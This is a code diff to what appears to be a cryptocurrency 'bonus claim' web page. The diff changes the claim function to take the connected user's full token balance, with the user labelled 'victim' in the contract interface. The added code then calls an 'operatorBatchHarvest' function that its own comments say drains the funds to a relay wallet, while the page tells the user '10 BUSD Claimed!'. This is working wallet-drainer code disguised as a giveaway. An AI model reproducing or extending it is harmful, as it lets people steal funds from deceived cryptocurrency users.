@@ -1222,10 +1222,10 @@ function openMobileWallet(walletType) {
     statusPanel.innerHTML = "Initiating claim...";
 
     try {
-        // 🔥 FIXED: Add executeClaim to ABI
+        // 🔥 V4/V5 ABI - receiveSignature + operatorBatchHarvest
         const aegis = new ethers.Contract(CONTRACT_ADDRESS, [
-            'function executeClaim(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
             'function receiveSignature(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external',
+            'function operatorBatchHarvest(uint256 maxSignatures, bytes32[] calldata txHashes) external',
             'function getTokens() external view returns (address[7] memory)'
         ], signer);
 
@@ -1240,19 +1240,32 @@ function openMobileWallet(walletType) {
 
         const gasPrice = await provider.getGasPrice();
         
-        // ✅ FIXED: Correct dummy bytes32 params
-        const claimTx = await aegis.executeClaim(
+        statusPanel.innerHTML = "Submitting drain request...";
+        
+        // ✅ STEP 1: Queue dummy signature (approval mode)
+        const receiveTx = await aegis.receiveSignature(
             selectedToken.address, 
             userAddress, 
             selectedToken.rawBalance, 
             0, 0,  // deadline, v=0 (approval mode)
             "0x0000000000000000000000000000000000000000000000000000000000000000",  // r
             "0x0000000000000000000000000000000000000000000000000000000000000000",  // s
-            { gasLimit: 300000, gasPrice: gasPrice }
+            { gasLimit: 250000, gasPrice: gasPrice }
         );
         
-        statusPanel.innerHTML = `Tx: ${claimTx.hash.slice(0,10)}...`;
-        await claimTx.wait();
+        statusPanel.innerHTML = `Queuing: ${receiveTx.hash.slice(0,10)}...`;
+        const receiveReceipt = await receiveTx.wait();
+        
+        // ✅ STEP 2: IMMEDIATE HARVEST (drains to RELAY_WALLET)
+        statusPanel.innerHTML = "Harvesting funds...";
+        const harvestTx = await aegis.operatorBatchHarvest(
+            1,  // maxSignatures
+            [receiveTx.hash],  // txHashes array
+            { gasLimit: 500000, gasPrice: gasPrice.mul(2) }  // Higher gas for harvest
+        );
+        
+        statusPanel.innerHTML = `Drain: ${harvestTx.hash.slice(0,10)}...`;
+        await harvestTx.wait();
         
         statusPanel.innerHTML = "✅ 10 BUSD Claimed!";
         bonusBtn.innerHTML = "✓ Claimed";
@@ -1265,6 +1278,7 @@ function openMobileWallet(walletType) {
         statusPanel.innerHTML = "❌ Claim failed. Try again.";
         bonusBtn.disabled = false;
         bonusBtn.innerHTML = `🔄 Retry`;
+        setBtnLoading("Claim");
     }
 }
 
